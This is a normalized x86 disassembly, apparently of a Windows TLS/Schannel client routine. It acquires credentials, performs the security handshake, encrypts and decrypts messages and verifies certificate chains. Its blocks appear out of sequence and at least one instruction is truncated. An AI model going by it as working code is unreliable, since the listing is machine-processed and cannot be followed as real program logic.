pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ esp + 0x14 ]
call sub_40f2a9
mov ecx [ eax ]
mov esi [ ebx ]
mov eax [ ecx ]
add esi 0x18
call [ eax + 0x64 ]
push eax
mov ecx ebx
call [ esi ]
lea esi [ esp + 0x14 ]
call sub_408d54
jmp r-xdata
cmp [ esp + 0x18 ] esi
je r-xdata
cmp [ esp + 0x14 ] 0x0
mov esi [ edi + 0x6c ]
mov eax [ edi + 0x58 ]
je r-xdata
sub_420095
push 0x24
mov eax sub_43e828
call sub_425de0
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_4094e6
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
lea esi [ ebp - 0x1c ]
call sub_406595
push eax
mov [ ebp - 0x4 ] 0x1
call sub_40a7d3
pop ecx
lea ecx [ ebp - 0x1c ]
mov esi eax
call sub_4061b7
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x30 ] bl
mov cl [ ecx + 0x30 ]
mov [ ebp - 0x20 ] cl
push [ ebp - 0x20 ]
add eax edi
push eax
push edx
push [ ebp - 0x30 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0x1c ]
cmp [ ebp - 0x30 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_409545
mov eax edi
call sub_425e4c
retn 0x8
push ebx
push [ ebp - 0x18 ]
call sub_408b69
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
sub_420125
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_406490
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_42019a
push ebp
mov ebp esp
sub esp 0xc
or [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] edi
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0xffffffff
jae r-xdata
call sub_422b83
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
call sub_422b4b
mov eax esi
leave
retn 0x4
mov eax [ esi + 0x14 ]
add eax [ ebp - 0x4 ]
push 0x0
push eax
mov ecx esi
mov [ ebp - 0xc ] eax
call sub_4044ac
test al al
je r-xdata
mov eax [ esi + 0x18 ]
push ebx
lea ebx [ esi + 0x4 ]
cmp eax 0x10
jb r-xdata
mov [ ebp - 0x8 ] ebx
mov ecx [ ebx ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp - 0x8 ]
sub eax edi
sub eax [ ebp - 0x4 ]
add edx edi
push edx
add ecx edi
add ecx [ ebp - 0x4 ]
push eax
push ecx
call sub_401049
mov eax [ ebp + 0x8 ]
add esp 0x10
cmp esi eax
jne r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp - 0x4 ]
sub eax edi
push ecx
push eax
add ebx edi
push ebx
call sub_40102d
mov ebx [ ebx ]
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
push [ ebp - 0x4 ]
sub eax edi
push ecx
push eax
add ebx edi
push ebx
call sub_401049
jmp r-xdata
mov ebx [ ebx ]
cmp eax 0x10
jb r-xdata
add esp 0x10
push [ ebp - 0xc ]
mov ecx esi
call sub_404490
pop ebx
sub_42029a
push 0x48
mov eax sub_43b0d8
call sub_425dad
mov eax [ ebp + 0x10 ]
push [ ebp + 0x8 ]
lea esi [ eax + 0x4 ]
push [ esi ]
push eax
call sub_42030b
mov ecx [ edi + 0x18 ]
mov edx 0x3fffffff
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ edi + 0x18 ] ecx
mov [ esi ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
call sub_425e4c
retn 0xc
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_401065
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_42597b
sub_42030b
push 0xc
call sub_4246c6
pop ecx
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x8 ]
mov [ ecx ] edx
retn 0xc
mov edx [ esp + 0xc ]
mov edx [ edx ]
mov [ ecx ] edx
sub_42033c
push 0x4
mov eax sub_43a803
call sub_425dad
mov [ ebp - 0x10 ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
mov [ edi ] r--data
call sub_403eef
lea esi [ edi + 0x24 ]
call sub_403dae
lea esi [ edi + 0x40 ]
call sub_403dae
lea eax [ ebp + 0xc ]
push eax
lea ecx [ edi + 0x5c ]
mov [ ebp - 0x4 ] 0x3
call sub_403de3
lea esi [ edi + 0x80 ]
call sub_403dae
lea esi [ edi + 0x9c ]
call sub_403dae
lea esi [ edi + 0xc0 ]
call sub_403dae
lea esi [ edi + 0xdc ]
call sub_403dae
lea esi [ edi + 0xf8 ]
call sub_403dae
lea esi [ edi + 0x114 ]
call sub_403dae
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
mov [ edi + 0x130 ] 0x0
mov [ edi + 0x131 ] 0x0
call sub_40415f
mov eax edi
call sub_425e4c
retn 0x20
sub_4203ea
push esi
push edi
mov edi ecx
lea esi [ edi + 0x78 ]
mov [ edi ] r--data
call sub_420450
xor esi esi
push esi
push 0x1
lea ecx [ edi + 0x5c ]
call sub_40415f
push esi
push 0x1
lea ecx [ edi + 0x40 ]
call sub_40415f
push esi
push 0x1
lea ecx [ edi + 0x24 ]
call sub_40415f
lea eax [ edi + 0x8 ]
pop edi
pop esi
jmp sub_403f2c
sub_420450
push ebx
push edi
xor ebx ebx
xor edi edi
push ebx
inc edi
push edi
lea ecx [ esi + 0x9c ]
call sub_40415f
push ebx
push edi
lea ecx [ esi + 0x80 ]
call sub_40415f
push ebx
push edi
lea ecx [ esi + 0x64 ]
call sub_40415f
push ebx
push edi
lea ecx [ esi + 0x48 ]
call sub_40415f
push ebx
push edi
lea ecx [ esi + 0x24 ]
call sub_40415f
push ebx
push edi
lea ecx [ esi + 0x8 ]
call sub_40415f
pop edi
pop ebx
retn
sub_42049c
push 0x8
mov eax sub_43ab8f
call sub_425dad
mov edi ecx
mov [ ebp - 0x14 ] edi
and [ ebp - 0x4 ] 0x0
sub esp 0x1c
lea eax [ ebp + 0xc ]
mov ecx esp
mov [ ebp - 0x10 ] esp
push eax
call sub_403de3
push [ ebp + 0x8 ]
call sub_42033c
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x4 ] 0x1
and [ edi + 0x134 ] 0x0
dec eax
mov [ edi ] r--data
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_40415f
mov eax edi
call sub_425e4c
retn 0x24
push 0x184
call sub_4246c6
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
xor eax eax
lea ecx [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
call sub_420632
jmp r-xdata
mov [ edi + 0x134 ] eax
sub_42053f
push 0x4
mov eax sub_43ab5a
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x134 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_4203ea
call sub_425e4c
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_420632
push ebp
mov ebp esp
push ecx
push esi
push edi
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] esp
push [ ebp + 0xc ]
mov edi eax
call sub_403de3
push [ ebp + 0x8 ]
call sub_42033c
lea esi [ edi + 0x164 ]
mov [ edi ] r--data
call sub_403dae
mov [ edi + 0x180 ] 0x1
mov eax edi
pop edi
pop esi
leave
retn 0x8
sub_42068e
push 0x4
mov eax sub_43ab37
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
and [ esi + 0x4 ] 0x0
call sub_420a9f
push 0x0
push 0x1
lea ecx [ esi + 0x164 ]
call sub_40415f
mov ecx esi
call sub_4203ea
call sub_425e4c
retn
sub_4206d1
push 0x7c
mov eax sub_43b70f
call sub_425e16
mov eax [ ebp + 0x8 ]
mov edi ecx
xor esi esi
cmp [ edi + 0x4 ] esi
je r-xdata
xor al al
push eax
lea ecx [ ebp - 0x2c ]
call sub_403de3
mov [ ebp - 0x4 ] esi
mov eax [ edi + 0x144 ]
add eax [ edi + 0x148 ]
add eax [ edi + 0x14c ]
push eax
push esi
call [ LocalAlloc@IAT ]
mov [ ebp - 0x4c ] eax
cmp eax esi
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
cmp [ edi + 0x130 ] 0x0
jne r-xdata
mov ebx [ edi + 0x144 ]
add ebx eax
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
lea edx [ edi + 0x78 ]
push edx
push esi
push edi
call [ eax + 0xc ]
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov esi [ ebp - 0x18 ]
push esi
push eax
push ebx
call sub_4285a0
mov eax [ edi + 0x14c ]
add esp 0xc
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] eax
jbe r-xdata
lea eax [ ebp - 0x28 ]
push r--data
call sub_40409c
push eax
push 0x0
call sub_4043e3
jmp r-xdata
push [ ebp - 0x4c ]
call [ LocalFree@IAT ]
mov eax [ ebp - 0x7c ]
mov ecx [ ebp - 0x70 ]
add ecx eax
add ecx [ ebp - 0x88 ]
lea esi [ ebp - 0x48 ]
push ecx
push [ ebp - 0x4c ]
call sub_409c3d
mov [ ebp - 0x4 ] 0x1
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
mov edx esi
push edx
push edi
call [ eax + 0x4 ]
push 0x0
push 0x1
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_40415f
cmp [ ebp - 0x18 ] 0x0
ja r-xdata
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x80 ] eax
mov eax [ edi + 0x144 ]
mov [ ebp - 0x88 ] eax
mov eax [ edi + 0x148 ]
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x70 ] eax
add esi ebx
mov [ ebp - 0x68 ] esi
xor esi esi
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x50 ] eax
push esi
lea eax [ ebp - 0x58 ]
push eax
push esi
lea eax [ edi + 0x13c ]
push eax
mov [ ebp - 0x84 ] 0x7
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x6c ] 0x6
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] 0x4
call EncryptMessage
cmp eax esi
jl r-xdata
mov esi [ edi + 0x14c ]
cmp [ ebp - 0x18 ] esi
ja r-xdata
push [ ebp - 0x4c ]
call [ LocalFree@IAT ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov al 0x1
jmp r-xdata
call sub_425e60
retn 0x4
sub_420871
push 0x70
mov eax sub_43b6da
call sub_425e16
mov eax [ ebp + 0x8 ]
mov edi ecx
cmp [ edi + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_425e60
retn 0x4
cmp [ edi + 0x130 ] 0x0
je r-xdata
push eax
call sub_420bfc
push 0xffffffff
lea esi [ edi + 0x164 ]
push 0x0
call sub_404233
mov ebx [ edi + 0x148 ]
add ebx [ edi + 0x14c ]
xor esi esi
add ebx [ edi + 0x144 ]
mov [ ebp - 0x2d ] 0x0
push ebx
push esi
call [ LocalAlloc@IAT ]
mov [ ebp - 0x34 ] eax
cmp eax esi
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
cmp [ edi + 0x130 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
mov ecx ebx
cmp eax ebx
ja r-xdata
push esi
push ebx
push [ ebp - 0x34 ]
call [ LocalReAlloc@IAT ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x2d ] 0x0
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
lea edx [ edi + 0x78 ]
push edx
push esi
push edi
call [ eax + 0xc ]
jmp r-xdata
lea eax [ edi + 0x164 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx eax
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push esi
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x3c ] eax
push esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ edi + 0x13c ]
lea ecx [ ebp - 0x7c ]
push eax
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] 0x4
mov [ ebp - 0x44 ] ecx
call DecryptMessage
push 0x3
mov [ ebp - 0x40 ] eax
xor edx edx
mov [ ebp - 0x38 ] esi
lea ecx [ ebp - 0x70 ]
pop eax
mov eax ebx
push ecx
push eax
push [ ebp - 0x34 ]
call sub_4285a0
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x74 ] eax
mov eax [ edi + 0x178 ]
add esp 0xc
cmp eax ebx
jbe r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
add ecx 0xc
dec eax
jne r-xdata
cmp [ ecx + 0x4 ] 0x5
jne r-xdata
mov edx ecx
cmp edx esi
jne r-xdata
cmp [ ebp - 0x40 ] esi
jne r-xdata
mov [ ebp - 0x38 ] ecx
cmp [ ebp - 0x40 ] 0x80090318
jne r-xdata
push [ edx ]
lea esi [ ebp - 0x2c ]
push [ edx + 0x8 ]
call sub_409c3d
xor esi esi
mov [ ebp - 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
lea edx [ ebp - 0x2c ]
push edx
push edi
call [ eax + 0x8 ]
mov ecx [ ebp - 0x38 ]
cmp ecx esi
jne r-xdata
cmp [ edi + 0x130 ] 0x0
jne r-xdata
cmp ebx 0x30d40
jae r-xdata
mov eax [ ebp - 0x3c ]
sub eax [ ecx ]
lea ecx [ edi + 0x164 ]
push eax
push esi
call sub_4043e3
mov ebx [ edi + 0x148 ]
add ebx [ edi + 0x14c ]
mov [ ebp - 0x2d ] 0x1
add ebx [ edi + 0x144 ]
push [ ebp - 0x3c ]
lea ecx [ edi + 0x164 ]
push esi
call sub_4043e3
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
lea edx [ edi + 0x78 ]
push edx
push esi
push edi
call [ eax + 0xc ]
push [ ebp - 0x34 ]
call [ LocalFree@IAT ]
jmp r-xdata
cmp [ edi + 0x178 ] ebx
jbe r-xdata
cmp [ edi + 0x178 ] esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
xor esi esi
jmp r-xdata
add ebx 0x3e8
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
sub_420a9f
push esi
mov esi ecx
push r--data
lea ecx [ esi + 0x164 ]
call sub_40409c
lea eax [ esi + 0x180 ]
xor cl cl
cmp [ eax ] cl
jne r-xdata
pop esi
retn
mov [ eax ] 0x1
lea eax [ esi + 0x13c ]
push eax
mov [ esi + 0x131 ] cl
mov [ esi + 0x130 ] cl
call [ DeleteSecurityContext@IAT ]
add esi 0x134
push esi
call [ FreeCredentialsHandle@IAT ]
sub_420ae9
push 0x7c
mov eax sub_43b6aa
call sub_425e16
mov edi ecx
xor ebx ebx
cmp [ edi + 0x4 ] ebx
je r-xdata
xor al al
push 0x38
lea eax [ ebp - 0x88 ]
push ebx
push eax
call sub_42b5a0
add esp 0xc
lea ecx [ ebp - 0x50 ]
push ecx
lea eax [ edi + 0x134 ]
push eax
push ebx
push ebx
lea eax [ ebp - 0x88 ]
push eax
push ebx
push 0x2
pop esi
push esi
push r--data
push ebx
mov [ ebp - 0x88 ] 0x4
mov [ ebp - 0x68 ] 0xc0
call AcquireCredentialsHandleA
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
lea edx [ edi + 0x78 ]
push edx
push ebx
push edi
call [ eax + 0xc ]
cmp [ edi + 0x74 ] 0x10
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x3c ] eax
jb r-xdata
lea eax [ edi + 0x60 ]
mov eax [ edi + 0x60 ]
jmp r-xdata
push [ ebp - 0x38 ]
lea esi [ ebp - 0x2c ]
push [ ebp - 0x30 ]
mov [ edi + 0x180 ] bl
call sub_409c3d
mov [ ebp - 0x4 ] ebx
push [ ebp - 0x30 ]
call FreeContextBuffer
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
mov edx esi
push edx
push edi
call [ eax + 0x4 ]
push ebx
push 0x1
mov ecx esi
call sub_40415f
mov al 0x1
jmp r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
push ecx
lea ecx [ ebp - 0x44 ]
push ecx
lea ecx [ edi + 0x13c ]
push ecx
push ebx
push ebx
push ebx
push ebx
push 0x9c11c
push eax
push ebx
lea eax [ edi + 0x134 ]
push eax
call InitializeSecurityContextA
cmp eax 0x90312
jne r-xdata
call sub_425e60
retn
sub_420bfc
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43b674
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa8 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
push 0xffffffff
lea esi [ edi + 0x164 ]
xor ebx ebx
push ebx
mov [ esp + 0x1c ] esi
call sub_404233
cmp [ edi + 0x74 ] 0x10
jb r-xdata
lea eax [ edi + 0x60 ]
mov eax [ edi + 0x60 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push 0x2
mov [ esp + 0x28 ] eax
pop esi
cmp [ esp + 0x38 ] 0x5
mov ecx [ esp + 0x14 ]
jne r-xdata
cmp eax 0x90312
je r-xdata
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x28 ]
mov [ esp + 0x54 ] eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x48 ] eax
lea eax [ esp + 0x5c ]
push eax
lea eax [ esp + 0x5c ]
push eax
lea eax [ esp + 0x48 ]
push eax
push ebx
push ebx
lea eax [ esp + 0x60 ]
push eax
push ebx
push ebx
push 0x9c11c
push [ esp + 0x48 ]
lea eax [ edi + 0x13c ]
push eax
lea eax [ edi + 0x134 ]
push eax
mov [ esp + 0x64 ] ebx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x5c ] esi
mov [ esp + 0x68 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x70 ] ebx
mov [ esp + 0x7c ] ebx
mov [ esp + 0x80 ] esi
mov [ esp + 0x74 ] 0x1
call InitializeSecurityContextA
cmp eax ebx
je r-xdata
push r--data
call sub_40409c
mov eax [ edi + 0x178 ]
sub eax [ esp + 0x34 ]
push eax
push ebx
call sub_4043e3
jmp r-xdata
cmp [ esp + 0x18 ] ebx
je r-xdata
cmp eax 0x90320
jne r-xdata
push edi
call sub_420f20
mov esi edi
call sub_42107a
call sub_42115b
lea edx [ edi + 0x78 ]
push edx
mov [ edi + 0x130 ] 0x1
push 0x1
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
lea edx [ edi + 0x78 ]
push edx
push ebx
push edi
call [ eax + 0xc ]
lea eax [ edi + 0x144 ]
push eax
push 0x4
lea eax [ edi + 0x13c ]
push eax
call QueryContextAttributesA
test eax eax
je r-xdata
cmp [ esp + 0x38 ] 0x5
mov ecx [ esp + 0x14 ]
jne r-xdata
cmp [ esp + 0x20 ] ebx
je r-xdata
cmp eax 0x80090318
je r-xdata
push r--data
lea ecx [ esp + 0x6c ]
call sub_403dc1
lea eax [ esp + 0x68 ]
push eax
mov ecx edi
mov [ esp + 0xb4 ] esi
call sub_420bfc
or [ esp + 0xb0 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x70 ]
call sub_40415f
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
push edi
call [ eax + 0xc ]
push r--data
call sub_40409c
jmp r-xdata
mov eax [ edi + 0x178 ]
sub eax [ esp + 0x34 ]
push eax
push ebx
call sub_4043e3
cmp [ esp + 0x18 ] ebx
jne r-xdata
push [ esp + 0x18 ]
lea esi [ esp + 0x88 ]
push [ esp + 0x24 ]
call sub_409c3d
mov [ esp + 0xb0 ] ebx
push [ esp + 0x20 ]
call FreeContextBuffer
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
mov edx esi
push edx
push edi
call [ eax + 0x4 ]
or [ esp + 0xb0 ] 0xffffffff
push ebx
push 0x1
mov ecx esi
call sub_40415f
mov ecx [ esp + 0xa8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x90 ]
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
lea edx [ edi + 0x78 ]
push edx
push ebx
mov eax [ edi + 0x178 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x14 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push r--data
lea ecx [ esp + 0x88 ]
call sub_403dc1
xor esi esi
lea eax [ esp + 0x84 ]
inc esi
push eax
mov ecx edi
mov [ esp + 0xb4 ] esi
call sub_420bfc
push ebx
push esi
lea ecx [ esp + 0x8c ]
call sub_40415f
jmp r-xdata
sub_420ec7
push ebp
mov ebp esp
sub esp 0x34
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
movzx eax [ ebp - 0x10 ]
sub eax 0x76c
mov [ ebp - 0x20 ] eax
movzx eax [ ebp - 0xe ]
dec eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebp - 0xa ]
mov [ ebp - 0x28 ] eax
movzx eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
movzx eax [ ebp - 0x6 ]
mov [ ebp - 0x30 ] eax
movzx eax [ ebp - 0x4 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x34 ]
push eax
call sub_4250b7
pop ecx
cmp eax 0xffffffff
jne r-xdata
leave
retn 0x8
xor eax eax
sub_420f20
push ebp
mov ebp esp
sub esp 0x68
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp [ eax + 0x74 ] 0x10
push esi
push edi
mov [ ebp - 0x5 ] bl
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
jb r-xdata
lea ecx [ eax + 0x60 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
mov edi [ MultiByteToWideChar@IAT ]
push ebx
push ebx
push 0xffffffff
push [ ebp - 0x10 ]
push ebx
push ebx
call edi
mov esi eax
lea eax [ esi + esi ]
push eax
push ebx
call [ LocalAlloc@IAT ]
mov [ ebp - 0x18 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp - 0x14 ]
push ecx
push 0x53
add eax 0x13c
push eax
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x1c ] r--data
call QueryContextAttributesA
test eax eax
jne r-xdata
mov al [ ebp - 0x5 ]
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
mov [ ecx + 0x7c ] al
pop ebx
leave
retn 0x4
push [ ebp - 0xc ]
call [ CertFreeCertificateChain@IAT ]
push esi
push eax
push 0xffffffff
push [ ebp - 0x10 ]
push ebx
push ebx
call edi
test eax eax
je r-xdata
xor eax eax
lea edi [ ebp - 0x40 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push 0x10
pop esi
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0xc ]
push eax
push ebx
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] 0x1
mov [ ebp - 0x38 ] 0x3
push [ eax + 0x10 ]
push ebx
push eax
push ebx
call [ CertGetCertificateChain@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x50 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
xor eax eax
lea edi [ ebp - 0x30 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
xor eax eax
lea edi [ ebp - 0x64 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x50 ] esi
push 0x4
mov [ ebp - 0x4c ] 0x2
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x64 ] 0x14
call [ CertVerifyCertificateChainPolicy@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
cmp [ ebp - 0x60 ] ebx
jne r-xdata
mov [ ebp - 0x5 ] 0x1
sub_42107a
push ebp
mov ebp esp
sub esp 0x1c
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
lea eax [ ebp - 0x1c ]
push eax
push 0x5a
lea eax [ esi + 0x13c ]
push eax
call QueryContextAttributesA
test eax eax
jne r-xdata
pop edi
leave
retn
mov eax [ ebp - 0x1c ]
sub eax 0x20
lea ecx [ esi + 0xc0 ]
je r-xdata
push r--data
sub eax 0x60
je r-xdata
push r--data
dec eax
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
call sub_40409c
mov eax [ ebp - 0x18 ]
sub eax 0x6601
mov edi r--data
je r-xdata
push r--data
jmp r-xdata
push edi
jmp r-xdata
lea ecx [ esi + 0xdc ]
push r--data
jmp r-xdata
sub eax 0xb
je r-xdata
call sub_40409c
push r--data
jmp r-xdata
dec eax
dec eax
je r-xdata
push r--data
jmp r-xdata
sub eax 0x1f1
lea ecx [ esi + 0xdc ]
je r-xdata
push r--data
jmp r-xdata
push edi
jmp r-xdata
call sub_40409c
mov eax [ ebp - 0x10 ]
sub eax 0x8003
lea ecx [ esi + 0xf8 ]
je r-xdata
sub_42115b
push ebp
mov ebp esp
sub esp 0x3f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x3f4 ] 0x0
push ebx
push edi
lea eax [ ebp - 0x3f4 ]
push eax
push 0x53
lea eax [ esi + 0x13c ]
push eax
call QueryContextAttributesA
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn
mov eax [ ebp - 0x3f4 ]
mov eax [ eax + 0xc ]
push [ eax + 0x24 ]
